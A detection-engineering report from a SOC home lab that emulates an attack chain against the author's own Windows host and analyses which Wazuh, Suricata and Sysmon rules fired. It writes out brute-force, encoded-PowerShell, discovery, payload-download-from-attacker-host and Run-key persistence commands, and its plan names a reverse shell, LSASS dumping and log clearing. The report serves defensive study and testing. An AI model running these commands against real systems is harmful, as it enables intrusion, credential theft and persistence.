---
title: "SOC Home Lab — Threat Emulation Report (Full Attack Chain)"
tags: [Blue Team, SOC Home Lab, Threat emulation, Detection engineering]
lang: en
breaks: true
---

# 04 — Threat Emulation Report: Full Attack Chain

[TOC]

| Item | Value |
|---|---|
| Author | Võ Minh Khoa |
| Environment | Isolated VMware lab (Wazuh, Suricata, pfSense, Sysmon) |
| Evidence window | 2026-08-28 → 2026-08-29 (original chain run) + 2026-10-09/10 (standalone Stage 2–3 re-test) + 2026-10-13 (standalone Stage 5, 7, 8b and 10 re-tests), alert timestamps UTC |
| Sources | Notes from the baseline detection-engineering run and the full attack-chain run, plus the raw alerts in `threat-emulation/evidence-logs/` |
| Related documents | [`01` setup](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/01-infrastructure-setup.md) · [`02` ingestion](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/02-log-ingestion-pipeline.md) · [`03` decoders & rules](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/03-Detection-engineering.md) |

---

> **Version alignment (2026-10-22):** This report distinguishes the original August run, later October re-tests, and the **currently committed** `sysmon_rules.xml`, Windows agent `ossec.conf` and Stage 11 scripts. The presence of a script/configuration does not establish execution or alert generation. Doc 3 and this report should carry the same `Pending Validation` statuses.

## 1. Executive Summary

A numbered 12-stage workflow (**Stage 0 preparation; Stages 1–11 from reconnaissance through an intended exfiltration test**) was documented against the **physical Windows 11 VMware host**. Stage 8b is a separate, optional LSASS test. The report distinguishes actions actually run and evidenced from planned or updated procedures: **Stage 11 has an updated script but no preserved end-to-end transfer or Wazuh detection evidence**. Historical tests must not be treated as validation of subsequent XML revisions.

**Results** (based on the raw alerts and screenshots in this repository, including re-tests on 2026-10-09/10/13):

| Outcome | Steps | Count |
|---|---|---|
| ✅ Detected by the designed custom rule, raw alert preserved | 2, 4, 5, 6, 7, 8, 10 | 7 |
| ⚠️ Detected, but by a built-in rule instead of the designed custom rule | 3 (Successful Access) | 1 |
| ✅ Detected, screenshot evidence only | 9 (File Lifecycle) | 1 |
| ⚠️ Inconclusive, no clean evidence | 1 (Reconnaissance), 8b (LSASS access — false positive correctly suppressed, true positive not yet tested) | 2 |
| ❌ No evidence yet | 11 (Exfiltration) | 1 |

**Key findings**

1. **Multiple parts of the workflow are observable across four telemetry layers**: network (Suricata), firewall (pfSense), host (Sysmon and Windows Security log), and file/reputation (FIM and VirusTotal). This does **not** mean that the full chain, especially Stage 1 and Stage 11, has been proven end-to-end.
2. **Three rounds of rule fixes and re-testing (2026-10-10, 2026-10-13) closed three of the four precedence/scope gaps found in the original run (Stages 5, 7 and 10; Stage 3 is still open).** Stages 5 (Discovery), 7 (Persistence) and 10 (Anti-Forensics) all moved from "a built-in rule fired instead of the custom rule" to "the custom rule fires, confirmed with a raw alert" — `100402`/`100407`/`100400` (Stage 5), `100406` (Stage 7), and `100412` (Stage 10). The common fix was the same confirmed mechanism in each case: chain the custom rule as an explicit child of the specific built-in rule that was winning (`if_sid`), or — for Stage 5 — simply widen the custom rule's own matching scope so it has no sibling to lose to (`docs/03`, §5, item 2).
3. **Stage 3 has a historical detection and a newer unvalidated correlation configuration.** The 2026-10-10 SMB retest produced a genuine `100408` alert followed by a successful NTLM network logon classified as built-in `92657`, not custom `100410`. The currently committed `sysmon_rules.xml` has **since changed** to `<if_sid>92657</if_sid>` with `<if_matched_sid>100408</if_matched_sid>` and `frequency="1" timeframe="200"`. Neither successful loading nor correct historical matching has been demonstrated after this revision; `frequency="1"` must be reviewed against the installed Wazuh version and a manager-side syntax/behavior test.
4. **Stage 8b captured a benign control event, not a true positive.** `procdump.exe` is not staged on the victim, so the planned LSASS-dump attack has not actually been run. What was captured instead is Windows Defender's own real-time-protection engine (`MsMpEng.exe`) touching LSASS memory during a routine scan — the built-in rule `92900` flagged this as "possible credential dump" (a false positive), while the custom `100411` stayed silent; the access mask (`0x101000`) is not one the rule looks for. The allow-list is not proven by this event (the exported path has doubled backslashes that the allow-list regex does not expect), so this shows that telemetry reaches the rule engine, not that the rule can catch a real dump attempt.
5. **Stage 1 and Stage 11 remain evidence gaps.** Stage 1’s pfSense alert is unrelated loopback DNS; a WAN-side retest has no clean correlated evidence. Stage 11 has a newer HTTP POST script but no preserved file-receipt/integrity evidence and no raw alert from `100413`. Rule `100410` and the LSASS positive case also remain pending validation.
6. **Log clearing did not blind the SOC**: the Security log was wiped on the endpoint, yet the alert had already been forwarded to Wazuh — and, after the fix, forwarded at the intended severity (level 15, not the built-in's level 5).

---

## 2. Scope, Rules of Engagement and Environment

### 2.1 Rules of engagement

- All activity was confined to systems owned by the author. VMware VMnet1 isolates the lab network segment, but the monitored Windows 11 endpoint is also the **physical VMware host**; exercises on it are not equivalent to running a disposable isolated Windows guest.
- Payloads were benign: the EICAR test string, `calc.exe` as the persistence target, and a self-written reverse shell using the standard .NET `TCPClient` (no vulnerability exploited).
- Every artifact created by the emulation is listed in [Appendix B](#appendix-b--artifacts-and-cleanup) together with its cleanup command.

### 2.2 Environment

![Figure 1 — Lab architecture and data flow](https://raw.githubusercontent.com/Khoavo-187/Wazuh-siem-home-lab/main/architecture/Architecture-and-data-flow.png)

*Figure 1 — Lab architecture and data flow.*

| Host | Role | IP |
|---|---|---|
| Kali Linux | Attacker | `192.168.60.135` (LAN) |
| Windows 11 (`LAPTOP-VF92GC15`) | **Physical VMware host and monitored victim**; Wazuh agent, Sysmon, Suricata (Npcap), FIM. It is not an isolated guest VM and cannot be restored with a guest snapshot. | `192.168.60.1` |
| Wazuh Manager | SIEM/XDR, VirusTotal integration | `192.168.60.137` |
| pfSense | Firewall and gateway, remote syslog | `192.168.60.254` |

### 2.3 Telemetry preconditions

A rule can only fire if its event exists. The following are configuration requirements and/or previously observed conditions; items explicitly marked unverified must not be treated as checked before the original run:

| Layer | Requirement | Used by |
|---|---|---|
| Windows | Advanced audit policy: Logon (success and failure), Process Creation with command line | Events `4624`, `4625`, `4688` |
| Sysmon | Event IDs 1, 3, 10, 11, 13 as filtered in the live Sysmon configuration; production of every event type must be checked | Stages 4–8b, Stage 11 network fallback |
| Wazuh agent | `Security`, `Microsoft-Windows-Sysmon/Operational`, **`Microsoft-Windows-PowerShell/Operational` (configured but not end-to-end verified)**; Suricata `eve.json`; realtime FIM for `virustotaltest` | Endpoint stages |
| PowerShell | Module Logging (4103) and Script Block Logging (4104) activation has **not** been verified on the endpoint | Stage 11 custom `100413` (4103) |
| Wazuh manager | Custom rules loaded (`wazuh-logtest`), VirusTotal integration active | All |
| Environment | Check host and guest clocks against one source; capture `date -u` before each future run. Historical pfSense samples show a significant clock discrepancy. `procdump.exe` was **not staged or run** during the recorded Stage 8b test. | Timeline, Stage 8b |

### 2.4 Verdict criteria

| Verdict | Meaning |
|---|---|
| ✅ | A raw alert (or a screenshot of it) shows the expected behaviour was detected |
| ⚠️ | An alert exists but does not match the stage, or a different rule fired than the one designed, or the evidence is condensed |
| ❌ | No alert evidence |

---

## 3. Emulation Plan

| # | Stage | Tactic | Technique | Procedure (tool, source → target) | Telemetry expected | Detection expected |
|---|---|---|---|---|---|---|
| 0 | Preparation | — | — | Remove old Hydra session; full packet capture with `tcpdump` on Kali | pcap | — |
| 1 | Reconnaissance | Reconnaissance, Discovery | T1595, T1018 | `nmap -sS -T4 -p-`, `ping -c 5` — Kali → `192.168.60.1` on the same VMnet1 segment | Endpoint Suricata alert; pfSense only if test traffic actually crosses it | Suricata `100300`; pfSense `100130`/`100201` only for separately routed tests |
| 2 | Brute Force | Credential Access | T1110 | `hydra` against SSH (`user.txt`, `password.txt`) — Kali → `:22` | Suricata alert, Windows `4625` | `100301`, `60122` |
| 3 | Successful Access | Initial Access | T1078 | `ssh lenovo@192.168.60.1` with the cracked credentials | Windows `4624` | `100410` (correlation) |
| 4 | Execution | Execution, Defense Evasion | T1059.001, T1027 | `powershell -NoProfile -EncodedCommand <base64>` | Sysmon EID 1 | `100401` |
| 5 | Discovery | Discovery | T1087, T1082, T1033 | `whoami`, `dir`, `net localgroup administrators`, `arp -a`, `systeminfo`, `tasklist` over SSH | Sysmon EID 1 | `100402`, `100407`, built-in `92031` |
| 6 | Payload Drop | Command and Control | T1105 | `python3 -m http.server 8000` on Kali; `curl` the EICAR file from the endpoint | Suricata alert, FIM, VirusTotal | `100306`, FIM, `87105` |
| 7 | Persistence | Persistence | T1547.001 | `reg add HKCU\...\CurrentVersion\Run /v UpdaterSvc` (target `calc.exe`) | Sysmon EID 13 | `100406` |
| 8 | Command and Control | Command and Control | T1071 | `nc -lvnp 4444` on Kali; PowerShell `TCPClient` reverse shell from the endpoint | Suricata alert, Sysmon EID 3 | `100304` |
| 8b | Credential Access | Credential Access | T1003.001 | `procdump -ma lsass.exe` through the reverse shell | Sysmon EID 10 | `100411` |
| 9 | File Lifecycle | — | — | Modify and delete files in the monitored folder | syscheck events | FIM (modified, deleted) |
| 10 | Cleanup / Anti-Forensics | Defense Evasion | T1070.001 | `wevtutil cl Security` | Security Event `1102` | `100412` |
| 11 | HTTP Transfer / Exfiltration Simulation | Execution, Exfiltration | T1059.001; **T1048.003 conditional** (HTTP outside C2; not cloud storage) | `Compress-Archive`; committed Windows script calls `Invoke-WebRequest -Method Post -InFile` to Kali `:8000/upload` | PowerShell Module Logging 4103; Sysmon EID 3 fallback | `100413` **pending**; generic `100404` may observe PowerShell network connection |

---

## 4. Execution and Analysis by Stage

Each stage lists the emulated behaviour, the telemetry it produced, the alert observed, the screenshots kept in the repository, and an analysis of what the result does and does not prove. Times are UTC (the lab's local time is UTC+7).

### Stage 0 — Preparation

```bash
# Kali
rm -f hydra.restore
sudo tcpdump -i eth0 -w full_chain_$(date +%Y%m%d_%H%M).pcap host 192.168.60.1 &
```

A packet capture for the whole chain gives an independent record to cross-check Suricata and pfSense. The capture file itself is not part of the repository.

---

### Stage 1 — Reconnaissance (T1595, T1018)

```bash
# Kali
nmap -sS -T4 -p- 192.168.60.1
ping -c 5 192.168.60.1
```

![Figure 2 — Stage 1 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage1_recon.png)

*Figure 2 — Stage 1: reconnaissance evidence screenshot (original run).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `100140` — pfSense TCP burst, level 6 (earlier rule version) |
| Alert time | 2026-08-28 05:32:14 |
| Log line | `filterlog`, interface `lo0`, `pass`, UDP, `127.0.0.1` → `127.0.0.1:53` |
| Decoder | `pfsense-lab` |

**Analysis**

- **The alert is not caused by the scan.** Source and destination are the loopback address, the interface is `lo0` and the port is 53 (DNS). It is background DNS traffic on the firewall itself, not Nmap traffic from Kali.
- **pfSense is probably not the right sensor for this step.** Kali and the Windows host sit in the same `/24`, and a firewall only logs traffic that crosses it (inference). This is the east-west case that motivates the second Suricata instance on the endpoint, so the expected alert is Suricata `100300` (sid `1000002`). No raw alert for it is preserved for this run.
- **Clock offset on pfSense.** The syslog timestamp in the log line is `Aug 27 11:57:42`, while Wazuh received the event on 2026-08-28 at 05:32 UTC, a gap of about 17.5 hours. pfSense is configured for `Etc/UTC` with an NTP pool, so a time-zone error is unlikely; a VM clock that fell behind while the host was asleep is more plausible. Either way it would break cross-source correlation.
- **The false positive is already addressed.** The current version of `100140` only counts connections to administrative ports (`22, 23, 445, 3389, 5900, 1433, 3306`), so loopback DNS no longer matches.

**Re-test attempt: triggering pfSense from the WAN side**

The root cause above — a same-LAN scan not necessarily transiting pfSense's own rule evaluation — led to a second idea, attempted but not completed with clean evidence:

1. Attack the pfSense **WAN** interface from outside the LAN (i.e. treat it like an internet-facing attacker, not a same-subnet neighbour): an Nmap scan or a Netcat-based port brute force directed at the WAN address.
2. Watch pfSense's own firewall decision on that traffic — **block** or **pass** — in the `filterlog`.
3. A packet reaching pfSense WAN will be evaluated by the WAN firewall rules. **No inbound WAN→LAN port-forward is represented by the documented topology**, so do not expect an unsolicited probe to reach the Windows endpoint. Such a test can still exercise pfSense block rules (`100101`/`100102`) if `filterlog` records it.

This is architecturally the traffic pfSense's rule tree is actually built to reason about (`srcip` outside the LAN, a real `block`/`pass` decision at the boundary) — unlike the original Stage 1 attempt, where attacker and victim share the same `/24` and pfSense mostly only sees its own background traffic.

**No usable evidence was captured.** The attempt produced events where the logged source IP did not look right — in a related Stage 2 re-test session (`192.168.60.1`, the *victim's own* LAN IP, appeared as the attacker source in one alert; see Stage 2 below) rather than a genuine external or WAN-side address. The likely cause is **NAT hairpinning**: when a host reaches the public/WAN IP through a path that pfSense ends up routing back through its own LAN interface, the original source address can be lost or rewritten, and Windows/Wazuh then report a local address instead of the real one. This has **not been confirmed** with a packet capture on both the WAN and LAN interfaces simultaneously, so treat it as a working hypothesis, not a finding. A second candidate is asymmetric routing: Kali has two adapters (`192.168.254.100` and `192.168.60.135`), so replies can leave by a different interface than the one the scan used. Test with Kali attached only to the WAN-side network.

**Verdict: ⚠️ Inconclusive** — re-run and capture the Suricata `100300` alert (see §7). The WAN-side idea above is worth repeating with `tcpdump` on both pfSense interfaces at once, to see directly whether the source IP survives the NAT hop.

---

### Stage 2 — Brute Force (T1110)

```bash
# Kali
hydra -L user.txt -P password.txt ssh://192.168.60.1
```

![Figure 3 — Stage 2 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage2_bruteforce.png)

*Figure 3 — Stage 2: brute-force evidence screenshot (original run).*

**Alerts observed**

| Layer | Rule | Level | Time | Key fields |
|---|---|---|---|---|
| Network (Suricata on the endpoint) | `100301` (sid `1000003`, rev 2) | 8 | 05:45:44 | `192.168.60.135:51814` → `192.168.60.1:22`, TCP, MITRE T1110 / TA0006 |
| Host (Windows Security) | `60122` (Event `4625`) | 5 | 05:46:44 (archive timestamp) | `targetUserName: lenovo`, `logonType: 8`, process `sshd.exe`, `status: 0xc000006d` (logon failure; the `subStatus` field appears only in the SMB re-test alert) |

**Analysis**

- **Two independent layers saw the same attack**: the network sensor counted repeated connection attempts to port 22, and the host recorded each failed logon. Either one alone would be weaker evidence.
- `logonType 8` and `sshd.exe` confirm the failures came through OpenSSH for Windows, not an interactive logon.
- **Correlation limitation, in this specific run.** This `4625` event does **not** contain an `ipAddress` field. See the 2026-10-10 re-test below — a different run of the same kind of attack *did* populate `ipAddress`, so the gap is not universal; it needs confirming whether it depends on the OpenSSH authentication path (`logonType 8` here vs. `logonType 3` in the re-test).
- Wazuh's built-in mapping for `60122` is T1531 (Account Access Removal). The brute-force meaning comes from `100301`, not from the built-in tag.
- Hydra initially stopped with "all children disabled"; OpenSSH `MaxStartups` throttling was the cause and was resolved by raising it and lowering the thread count.

**Verdict: ✅ Detected** (custom `100301` plus built-in `60122`).

**2026-10-10 re-test — `100408` confirmed firing correctly**

```bash
# Kali — re-test, 2026-10-10: Hydra against SMB instead of SSH
hydra -L user.txt -P password.txt smb://192.168.60.1
```

A later, standalone re-test of the brute-force → logon sequence (separate session, not part of the original 2026-08-28 chain) produced a raw alert from the custom correlation rule itself:

| Field | Value |
|---|---|
| Rule | `100408` — "Windows: Multiple failed logons... possible brute force", level 10 (T1110) |
| Time | 2026-10-10 17:37:52 (`firedtimes: 3`) |
| Key fields | `targetUserName: lenovo`, `ipAddress: 192.168.60.135`, `logonType: 3`, `authenticationPackageName: NTLM`, `workstationName: KALI` |

**Different protocol this time: SMB, not SSH.** The re-test used Hydra against the **SMB** service (`smb://`) rather than SSH — confirmed, not inferred. This fully explains the field differences from the original run: `logonType 3` (Network) and `authenticationPackageName: NTLM` are the standard signature of SMB/CIFS authentication (`NtLmSsp`), versus `logonType 8` for the original OpenSSH password exchange. `ipAddress` being populated here is consistent with SMB's logon path specifically — it does not resolve the earlier SSH `logonType 8` gap (Stage 2's first attempt), which is a separate, still-open question (see Gap Analysis). This is the first raw evidence that `100408` itself (not just the underlying `60122`) fires as designed, with the correct source IP. A separate Discover search for `100410` around this time found none — only built-in `60106`/`60118` entries, consistent with the precedence finding below (Stage 3).

**Suricata coverage for SMB, not yet checked.** The custom Suricata rule for this service is `100303` (SMB Port Probe, sid `1000005`), not `100301` (SSH, which covers the original run). No Suricata evidence was captured for this specific re-test session — see the gap analysis.

A separate, earlier attempt on 2026-10-09 also produced a `100408` alert, but with `ipAddress` showing `192.168.60.1` — the **victim's own LAN address** rather than Kali's — a clear artifact rather than a genuine attacker IP (Figure 4). This matches the WAN-side NAT-hairpin hypothesis noted in Stage 1: if that attempt was made against the WAN-facing address through a reflected/hairpinned path, the true source can get lost. Not confirmed; flagged here for the same reason as Stage 1.

![Figure 4 — Stage 2, 2026-10-09 preliminary attempt: 100408 fires but ipAddress shows the victim's own LAN address](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage2_rule.png)

*Figure 4 — The source IP artifact that motivated the WAN-hairpin hypothesis in Stage 1.*

See [`threat-emulation/evidence-logs/stage02-rule-100408-bruteforce-retest.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage02-rule-100408-bruteforce-retest.json).

---

### Stage 3 — Successful Access (T1078)

```bash
# Kali — log in with the cracked credentials
ssh lenovo@192.168.60.1
```

![Figure 5 — Stage 3 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage3_access.png)

*Figure 5 — Stage 3 evidence screenshot (original run).*

**First attempt (2026-08-28) — alert observed**

| Field | Value |
|---|---|
| Rule | `60115` — user account locked out, level 9 |
| Event | Windows `4740` for account `LENOVO` |
| Time | 05:46:44 (alert time) — within the same second as the Stage 2 failed logon |
| Mapping | T1110, T1531 |

**Analysis — first attempt**

- **The evidence does not prove a successful login.** Event `4740` shows that the brute force locked the account, which is an impact of Stage 2. The goal of this stage, valid-account use, was not demonstrated.
- A locked account would also have blocked the cracked credentials, so the lockout likely prevented this stage from succeeding at that moment.

**2026-10-10 re-test — successful logon captured**

```bash
# Kali — connect with the credentials Hydra recovered
smbclient //192.168.60.1 -U 'Lenovo'
```

Following the account unlock and the Stage 2 re-test above (Hydra against SMB, then `smbclient` to confirm the cracked credentials), a genuine successful logon appeared:

| Field | Value |
|---|---|
| Rule | `92657` — built-in "Successful Remote Logon Detected", level 6 |
| Event | Windows `4624` for account `LENOVO` |
| Time | 2026-10-10 17:38:11 (18 seconds after the `100408` alert in Stage 2) |
| Key fields | `targetUserName: LENOVO`, `ipAddress: 192.168.60.135`, `logonType: 3`, `authenticationPackageName: NTLM`, `workstationName: KALI` |
| Rule's own mapping | T1550.002 (Pass the Hash), T1078.002 (Domain Accounts), T1021.001 (Remote Desktop Protocol) — **the T1021.001/RDP tag is the same built-in boilerplate issue noted below; the real technique here is T1021.002 (SMB/Windows Admin Shares)** |

See [`threat-emulation/evidence-logs/stage03-rule-92657-successful-logon.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage03-rule-92657-successful-logon.json). The same Discover session also showed `67028` ("Special privileges assigned to new logon", level 3) immediately after, and the `60122` failed-logon burst immediately before — the same sequence as the raw alerts (no screenshot captured for this specific view).

**Analysis — re-test**

- **The goal of this stage is now demonstrated**: a real `4624` following a real failed-logon burst, 18 seconds apart, same `targetUserName` and `ipAddress` as Stage 2's `100408`.
- **Built-in rule, not the custom one — the same sibling-precedence pattern seen elsewhere in the project.** The **then-current** custom `100410` (`if_sid 60106`, `if_matched_sid 100408`) did not appear; `92657` did. `92657` is very likely another child of `60106` (the base "logon success" rule). This is the same mechanism already confirmed and fixed for `100406`/`92302` and `100412`/`63103` (`docs/03`, §3.3 and §5, item 2) — The **current** XML now chains `100410` under `92657`; the correction was applied **after** this historical retest and has no confirmed positive result yet.
- **Confirmed: this is SMB, not SSH and not RDP.** `92657`'s built-in description guesses "Possible RDP connection" — that wording is generic boilerplate Wazuh attaches to any NTLM `logonType 3` network logon, and it is misleading here: the access was `smbclient`, not RDP. The `logonType 3`/NTLM/`NtLmSsp` fields are the standard SMB signature, matching Stage 2's re-test above. This stage's *first* attempt (SSH, `logonType 8`) and this re-test (SMB, `logonType 3`) are two different access methods proving the same underlying idea — a successful logon following a credential-stuffing burst — over two different services.
- Because `ipAddress` was populated correctly here, the earlier concern (Stage 2) that SSH logons might never populate it, and so `100408`/`100410`'s `same_field ipAddress` correlation could never match, does not apply to this run — the correlation condition itself is satisfiable; only the sibling-rule precedence stopped `100410` from being the one reported.

**Verdict: ⚠️ Detected, but by a built-in rule (`92657`)** — the one remaining open instance of the sibling-precedence pattern (`docs/03`, §5, item 2); custom `100410` not yet proven.

---

### Stage 4 — Execution (T1059.001, T1027)

```powershell
$cmd   = 'whoami; hostname; ipconfig /all'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc   = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $enc
```

**Alert observed**

| Field | Value |
|---|---|
| Rule | `100401` — encoded PowerShell command, level 10 (T1027, T1059.001) |
| Time | 2026-08-28 06:34:55 |
| Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, integrity `High` |
| Parent | `powershell.exe` |
| User | `LAPTOP-VF92GC15\LENOVO` |
| Command line | `powershell.exe -NoProfile -EncodedCommand dwBoAG8AYQBtAGkAOwAg…` |
| Decoded payload | `whoami; hostname; ipconfig /all` |

**Analysis**

- The Base64 string is UTF-16LE, the encoding PowerShell expects, and decodes cleanly to the three discovery commands. Seeing the full command line in Sysmon makes the obfuscation trivial to reverse during triage.
- **Why it fired:** the evidence version of `100401` is a child of `100400`, which requires the parent process to be PowerShell. The test ran PowerShell from a PowerShell session, so the chain matched. A launch from `cmd.exe` or `explorer.exe` would not have matched; the version now in the repository is independent of the parent and also accepts the `-e` and `-ec` abbreviations.
- No screenshot was kept for this stage; the raw alert is the evidence.

**Verdict: ✅ Detected** (custom `100401`).

---

### Stage 5 — Discovery (T1087, T1082, T1033)

```cmd
:: executed over the SSH session from Kali
whoami
dir
net localgroup administrators
arp -a
systeminfo
tasklist
```

![Figure 6 — Stage 5 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage5_discovery.png)

*Figure 6 — Stage 5 evidence screenshot (original 2026-08-28 run).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `92031` — built-in Sysmon rule, Account Discovery (T1087) |
| Time | 2026-08-28 06:48:04 |
| Process | `net1.exe`, spawned by `net.exe` |
| Command line | `net1 localgroup administrators` |
| User / integrity | `LAPTOP-VF92GC15\LENOVO` / `High` |

**Analysis — first attempt**

- Discovery was detected, but by a **built-in rule**. The custom `100400` and `100402` were the expected triggers and were not observed.
- **The custom rules did not target these commands at the time.** `100402` matched only `whoami`, `systeminfo`, `tasklist` and `nltest`, so `net.exe`, `net1.exe`, `arp.exe` and `dir` fell outside its scope. `100400` required a PowerShell parent specifically, but the commands ran from an SSH command shell.
- `100407` (three discovery binaries by the same user within 120 seconds) should have been satisfied by `whoami`, `systeminfo` and `tasklist` run in close succession, but no alert for it was captured.
- Known false positive: processes spawned from `ossec-agent\` under `SYSTEM` (the Wazuh SCA module) also trigger `T1087`. Checking `currentDirectory` and `user` separates it from attacker activity.

**2026-10-13 re-test — custom rules confirmed firing**

```cmd
:: executed via a PowerShell parent this time
whoami
tasklist
systeminfo
net
net1
arp -a
```

Following a rewrite of the Sysmon rules (scope widened, see `docs/03` §3.3), a re-test from a PowerShell parent produced six custom-rule alerts in under 10 seconds:

![Figure 7 — Stage 5 re-test, 2026-10-13: custom rules firing for whoami, tasklist, systeminfo, net, net1 and ARP.EXE](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage5_evidence.png)

*Figure 7 — Six consecutive custom-rule alerts; no built-in `92031` row appears in this view.*

| Rule | Level | Time (UTC) | What fired |
|---|---|---|---|
| `100402` | 6 | 05:04:30 | `whoami.exe` — "Reconnaissance binary executed" |
| `100402` | 6 | 05:04:32 | `tasklist.exe` — "Reconnaissance binary executed" |
| `100407` | 12 | 05:04:34 | Correlation: `whoami` → `tasklist` → `systeminfo` within 4.2s (`frequency=3` met) |
| `100400` | 5 | 05:04:38 | `ARP.EXE` spawned by `powershell.exe` — "Shell spawned child process" |
| `100402` | 6 | 05:04:42 | `net1.exe` — "Reconnaissance binary executed" |
| `100402` | 6 | 05:04:42 | `net.exe` — "Reconnaissance binary executed" |

See [`threat-emulation/evidence-logs/stage05-rule-100407-recon-burst.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage05-rule-100407-recon-burst.json) and [`stage05-rule-100400-shell-child-arp.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage05-rule-100400-shell-child-arp.json) for the raw alerts (`100402`'s own raw alert was not individually exported; Figure 7 is the Discover view for the whole sequence).

**Analysis — re-test**

- **`100402`'s scope is now confirmed** (current rule XML): `(?i)(?:whoami|systeminfo|tasklist|nltest|net|net1)\.exe$`, plus the correlation rule `100407` now correlates off `100402` directly. `net.exe`/`net1.exe` both match, as shown. **`arp` is confirmed not in this pattern** — `ARP.EXE` only triggers the generic `100400` ("Shell spawned child process"), not "Reconnaissance binary executed". Add `arp` to `100402` if parity with `net`/`net1`/`whoami` is wanted; it is a one-token change.
- **`100407`'s correlation logic is confirmed correct**: it fired once, exactly when the 3rd qualifying binary (`systeminfo`) landed within the 120-second window of the first (`whoami`). No second `100407` appeared for the later `net`/`net1` events; `100407` has no `ignore`, so this is not explained by the threshold arithmetic alone — treat it as observed behaviour.
- **`100400`'s known bug is fixed and its scope confirmed widened.** The earlier version truncated the description at `$(win.eventdata.user` (missing closing parenthesis, `docs/03` §5 item 13) — the new alert renders the full value. `parentImage` is now confirmed `(?i)(?:powershell|pwsh|cmd|net)\.exe$` (widened beyond PowerShell, matching the rename to "Shell spawned child process" / group `shell_child`), and a negated `image` filter now excludes `whoami`, `systeminfo`, `tasklist`, `nltest`, `curl`, `bitsadmin` and `certutil`, so that the more specific rules are not shadowed. **Caveat (current XML)**: the live exclusion list does not contain `net`/`net1`. One event produces one alert and `100400` precedes `100402` in the file, so `net`/`net1` started from a shell should now be reported as `100400` and not counted by `100407`. The raw alerts above predate that exclusion list; re-run Stage 5 before relying on them for `net`/`net1`.
- **Built-in `92031` does not appear in Figure 7's six rows** — six custom alerts cover the same window the original run's single `92031` alert occupied, and no `92031` row is visible here. This is not an exhaustive search of the whole index, so it is reported as "not observed in this view" rather than "confirmed absent".
- **Group names**: the stored alerts for later rules (`100406`, `100412`) show merged group names (`windowspersistence`, `windowslog_cleared`); see `docs/03` §5 item 16, and check `rule.groups` on a fresh `100400`/`100402` alert as well.

**Verdict: ✅ Detected by custom rules** (`100402`, `100407`, `100400`) — all three raised raw alerts in the 2026-10-13 re-test, closing the Stage 5 gap. `arp.exe`-specific coverage remains a minor, optional follow-up.

---

### Stage 6 — Payload Drop (T1105)

```bash
# Terminal 1 (Kali)
python3 -m http.server 8000
```

```cmd
:: Terminal 2 — SSH session on the victim
curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com"
```

![Figure 8 — Stage 6 evidence screenshot 1 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage6_payload1.png)

![Figure 9 — Stage 6 evidence screenshot 2 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage6_payload2.png)

![Figure 10 — Stage 6 evidence screenshot 3 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage6_payload3.png)

*Figures 8–10 — Stage 6: the three alerts raised by one download (Suricata, FIM, VirusTotal), original run.*

**Three layers fired from one action**

| Layer | Rule | What it shows |
|---|---|---|
| Network | `100306` (sid `1000008`) | `GET /eicar-facebook.com` from `192.168.60.135:8000` to `192.168.60.1:58826`, user-agent `curl/8.21.0`, HTTP 200, 69 bytes, MITRE T1105 — alert time 2026-08-28 07:09:53 |
| Host file | FIM (syscheck) "file added", level 5 | A new file appeared in the monitored folder |
| Reputation | `87105` — VirusTotal, level 12 | Hash looked up automatically; earlier lab run: `found: 1`, `positives: 62`, md5 `44d88612fea8a8f36de82e1278abb02f` |

**Analysis**

- This is the clearest example of **defense in depth**: the network sensor sees the transfer, FIM sees the file land, and VirusTotal says the hash is malicious. Losing one layer still leaves two.
- The standard EICAR file was used because its hash is known worldwide; a self-made test file returned `found: 0` in an earlier attempt.
- **Limits.** Suricata inspects the HTTP body only in clear text. The built-in `87105` rule tags the event as T1203 (Exploitation for Client Execution), not T1105.
- **Rules that did not match this download.** The curl-download rule (`1000011`) requires a URI ending in `.sh`, `.ps1`, `.exe`, `.bat` or `.dll`, so `.com` does not match.
- The raw VirusTotal alert preserved in the baseline report dates from an earlier run on 2026-08-17; for this chain the VirusTotal and FIM alerts are documented by the screenshots.

**Verdict: ✅ Detected** (custom `100306` with raw alert; FIM and VirusTotal by screenshot).

---

### Stage 7 — Persistence (T1547.001)

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterSvc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

![Figure 11 — Stage 7 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage7_persistence.png)

*Figure 11 — Stage 7 evidence screenshot (original 2026-08-28 run).*

**First attempt (2026-08-28) — alert observed**

| Field | Value |
|---|---|
| Rule | `92302` — built-in Sysmon registry Run key rule (T1547.001), level 6 |
| Event | Sysmon EID 13, `SetValue` |
| Time | 2026-08-28 07:46:46 |
| Process | `C:\Windows\system32\reg.exe` |
